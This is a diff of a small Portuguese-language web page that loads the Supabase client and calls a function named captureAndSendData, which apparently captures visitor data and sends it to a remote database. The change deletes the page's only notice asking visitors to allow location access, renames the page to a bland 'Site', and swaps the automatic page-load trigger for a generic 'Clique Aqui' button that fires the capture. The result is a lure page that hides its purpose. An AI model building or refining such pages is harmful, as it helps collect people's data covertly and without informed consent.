@@ -3,12 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bem-vindo ao Site</title>
+    <title>Site</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            border: none;
+            background-color: #007bff;
+            color: white;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <h1>Bem-vindo ao nosso site!</h1>
-    <p>Por favor, permita o acesso à sua localização para uma melhor experiência.</p>
+    <button id="triggerButton">Clique Aqui</button>
 
     <script>
         // Configuração do Supabase com suas chaves
@@ -77,8 +98,8 @@
             }
         }
 
-        // Executa a função assim que a página carrega
-        window.onload = captureAndSendData;
+        // Adiciona o evento de clique ao botão
+        document.getElementById('triggerButton').addEventListener('click', captureAndSendData);
     </script>
 </body>
 </html>
